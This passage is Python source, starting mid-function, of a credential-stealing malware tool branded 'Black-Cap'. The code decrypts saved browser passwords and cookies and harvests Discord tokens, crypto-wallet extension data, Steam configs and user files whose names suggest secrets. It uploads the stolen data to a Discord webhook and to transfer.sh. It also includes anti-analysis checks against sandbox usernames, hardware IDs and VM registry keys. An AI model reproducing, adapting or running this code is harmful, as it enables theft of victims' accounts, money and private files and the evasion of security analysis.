            for _file in files:
                files_found += f"・{_file}\n"
                file_count += 1
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{file_count} Files Found: "

        embed = {
            'name': "Blackcap",
            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
            'embeds': [
                {
                    'author': {
                        'name': f'Black - Cap v2.1',
                        'url': 'https://github.com/KSCHdsc',
                        'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
                    },
                    'color': 374276,
                    'description': f'[Black - Cap has Geo Localised this guy]({self.googlemap})',
                    'fields': [
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                IP:᠎ {self.ip.replace(" ", "᠎ ") if self.ip else "N/A"}
                                Org:᠎ {self.org.replace(" ", "᠎ ") if self.org else "N/A"}
                                City:᠎ {self.city.replace(" ", "᠎ ") if self.city else "N/A"}
                                Region:᠎ {self.region.replace(" ", "᠎ ") if self.region else "N/A"}
                                Country:᠎ {self.country.replace(" ", "᠎ ") if self.country else "N/A"}```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '\u200b',
                            'value': f'''```fix
                                Computer Name: {vctm_pc.replace(" ", "᠎ ")}
                                Windows Key:᠎ {self.w1nk33y.replace(" ", "᠎ ")}
                                Windows Ver:᠎ {self.w1nv3r.replace(" ", "᠎ ")}
                                Disk Stockage:᠎ {d1sk}GB
                                Ram Stockage:᠎ {r4m}GB```
                            '''.replace(' ', ''),
                            'inline': True
                        },
                        {
                            'name': '**- Tokens:**',
                            'value': f'''```yaml
                                {tokens if tokens else "tokens not found"}```
                            '''.replace(' ', ''),
                            'inline': False
                        },
                        {
                            'name': fileCount,
                            'value': f'''```ini
                                [
                                {files_found.strip()}
                                ]```
                            '''.replace(' ', ''),
                            'inline': False
                        }
                    ],
                    'footer': {
                        'text': 'Black Cap Create By KSCH・https://github.com/KSCHdsc'
                    }
                }
            ]
        }


        with open(_zipfile, 'rb') as f:
            if self.h00ksreg in self.w3bh00k:
                httpx.post(self.w3bh00k, json=embed)
                httpx.post(self.w3bh00k, files={'upload_file': f})
        os.remove(_zipfile)



class AntiDebug(Functions):
    inVM = False

    def __init__(self):
        self.processes = list()

        self.bluseurs = [
            "WDAGUtilityAccount", "Robert", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq",
            "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl",
        ]
        self.blpcname = [
            "DESKTOP-CDLNVOQ", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM",
            "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
            "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
        ]
        self.blhwid = [
            "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009",
            "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "79AF5279-16CF-4094-9758-F88A616D81B4",
            "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022",
            "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF",
            "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
            "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
        ]

        for func in [self.lstchec, self.regkey, self.sp3cCheq]:
            process = threading.Thread(target=func, daemon=True)
            self.processes.append(process)
            process.start()
        for t in self.processes:
            try:
                t.join()
            except RuntimeError:
                continue

    def programExit(self):
        self.__class__.inVM = True

    def lstchec(self):
        for path in [r'D:\Tools', r'D:\OS2', r'D:\NT3X']:
            if ntpath.exists(path):
                self.programExit()

        for user in self.bluseurs:
            if infocom == user:
                self.programExit()

        for pcName in self.blpcname:
            if vctm_pc == pcName:
                self.programExit()

        for uuidwndz in self.blhwid:
            if self.sys_1fo()[0] == uuidwndz:
                self.programExit()

    def sp3cCheq(self):
        if int(r4m) <= 3: 
            self.programExit()
        if int(d1sk) <= 120:  
            self.programExit()
        if int(psutil.cpu_count()) <= 1:
            self.programExit()

    def regkey(self):
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")
        if (reg1 and reg2) != 1:
            self.programExit()

        handle = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
        try:
            reg_val = winreg.QueryValueEx(handle, '0')[0]
            if ("VMware" or "VBOX") in reg_val:
                self.programExit()
        finally:
            winreg.CloseKey(handle)
            
            







if __name__ == "__main__" and os.name == "nt":
    asyncio.run(bl4ckc4p().init())




local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")
Threadlist = []

def fetch_conf(e: str) -> str or bool | None:
        return __config__.get(e)

hook = fetch_conf("yourwebhookurl")

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

def LoadRequests(methode, url, data='', files='', headers=''):
    for i in range(8):
        try:
            if methode == 'POST':
                if data != '':
                    r = requests.post(url, data=data)
                    if r.status_code == 200:
                        return r
                elif files != '':
                    r = requests.post(url, files=files)
                    if r.status_code == 200 or r.status_code == 413: # 413 = DATA TO BIG
                        return r
        except:
            pass

def LoadUrlib(hook, data='', files='', headers=''):
    for i in range(8):
        try:
            if headers != '':
                r = urlopen(Request(hook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(hook, data=data))
                return r
        except:
            pass


def Trust(Cookies):
    global DETECTED
    data = str(Cookies)
    tim = re.findall(".google.com", data)
    if len(tim) < -1:
        DETECTED = True
        return DETECTED
    else:
        DETECTED = False
        return DETECTED




def Reformat(listt):
    e = re.findall("(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def upload(name, tk=''):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if name == "blackcapedez":
        data = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Interesting files found on user PC:",
                "value": tk
                }
            ],
            "author": {
                'name': f'Black - Cap v2.2',
                'url': 'https://github.com/KSCHdsc',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "github.com/KSCHdsc"
            },
            'color': 374276,
            }
        ],
        "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
        "attachments": []
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
        return

    path = name
    files = {'file': open(path, 'rb')}

    if "bc_allpasswords" in name:

        ra = ' | '.join(da for da in paswWords)

        if len(ra) > 1000:
            rrr = Reformat(str(paswWords))
            ra = ' | '.join(da for da in rrr)

        data = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Passwords Found:",
                "value": ra
                }
            ],
            "author": {
                'name': f'Black - Cap v2.2',
                'url': 'https://github.com/KSCHdsc',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "github.com/KSCHdsc",
            },
            'color': 374276,
            }
        ],
         "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
        "attachments": []
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    if "bc_allcookies" in name:
        rb = ' | '.join(da for da in cookiWords)
        if len(rb) > 1000:
            rrrrr = Reformat(str(cookiWords))
            rb = ' | '.join(da for da in rrrrr)

        data = {
        "content": '',
        "embeds": [
            {
            "fields": [
                {
                "name": "Cookies Found:",
                "value": rb
                }
            ],
            "author": {
                'name': f'Black - Cap v2.2',
                'url': 'https://github.com/KSCHdsc',
                'icon_url': 'https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif'
            },
            "footer": {
                "text": "github.com/KSCHdsc",
            },
            'color': 374276,
            }
        ],
         "avatar_url": "https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png",
        "attachments": []
        }
        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)

    LoadRequests("POST", hook, files=files)

def writeforfile(data, name):
    path = os.getenv("TEMP") + f"\{name}.txt"
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(f"Created by KSCH | https://github.com/KSCHdsc\n\n")
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")



Passw = []
def getPassw(path, arg):
    global Passw
    if not os.path.exists(path): return

    pathC = path + arg + "/Login Data"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
    shutil.copy2(pathC, tempfold)
    conn = connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in paswWords: paswWords.append(old)
            Passw.append(f"URL: {row[0]} \n ID: {row[1]} \n PASSW0RD: {DecryptValue(row[2], master_key)}\n\n")
    writeforfile(Passw, 'bc_allpasswords')

Cookies = []
def getCookie(path, arg):
    global Cookies
    if not os.path.exists(path): return

    pathC = path + arg + "/Cookies"
    if os.stat(pathC).st_size == 0: return

    tempfold = temp + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

    shutil.copy2(pathC, tempfold)
    conn = connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "/Local State"

    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != '':
            for wa in keyword:
                old = wa
                if "https" in wa:
                    tmp = wa
                    wa = tmp.split('[')[1].split(']')[0]
                if wa in row[0]:
                    if not old in cookiWords: cookiWords.append(old)
            Cookies.append(f" HOST KEY: {row[0]} | NAME: {row[1]} | VALUE: {DecryptValue(row[2], master_key)}")
    writeforfile(Cookies, 'bc_allcookies')

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    #Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;


def ZipThings(path, arg, procc):
    pathC = path
    name = arg

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg

    if not os.path.exists(pathC): return
    if checkIfProcessRunning('chrome.exe'):
        print('Yes a chrome process was running')
        subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    else:
        ...
        

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg

    zf = zipfile.ZipFile(f"{pathC}/{name}.zip", "w")
    print(zf)
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    upload(f'{pathC}/{name}.zip')
    os.remove(f"{pathC}/{name}.zip")


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]



    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"]
    ]


    for patt in browserPaths:
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for patt in browserPaths:
        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()

    for patt in PathsToZip:
        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()

    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["bc_allpasswords.txt", "bc_allcookies.txt"]:
        upload(os.getenv("TEMP") + "\\" + file)


def uploadToAnonfiles(path):
    try:

        files = { "file": (path, open(path, mode='rb')) }
        ...
        upload = requests.post("https://transfer.sh/", files=files)
        url = upload.text
        return url
    except:
        return False

def blackcapedezFolder(pathF, keywords):
    global blackcapedezFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    blackcapedezFiles.append(["folder", pathF + "/", ffound])

blackcapedezFiles = []
def blackcapedezFile(path, keywords):
    global blackcapedezFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    blackcapedezFolder(target, keywords)
                    break

    blackcapedezFiles.append(["folder", path, fifound])

def blackcapedez():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret"
        ]

    wikith = []
    for patt in path2search:
        blackcapedez = threading.Thread(target=blackcapedezFile, args=[patt, key_wordsFiles]);blackcapedez.start()
        wikith.append(blackcapedez)
    return wikith


global keyword, cookiWords, paswWords

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]


cookiWords = []
paswWords = []

GatherAll()
DETECTED = Trust(Cookies)

if not DETECTED:
    wikith = blackcapedez()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in blackcapedezFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext +=f"```diff\n"
            filetext += f"- {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"+ Name: {fileanme}\n+ Link: {b}"
                filetext += "\n```"
                filetext += "\n"
    upload("blackcapedez", filetext)
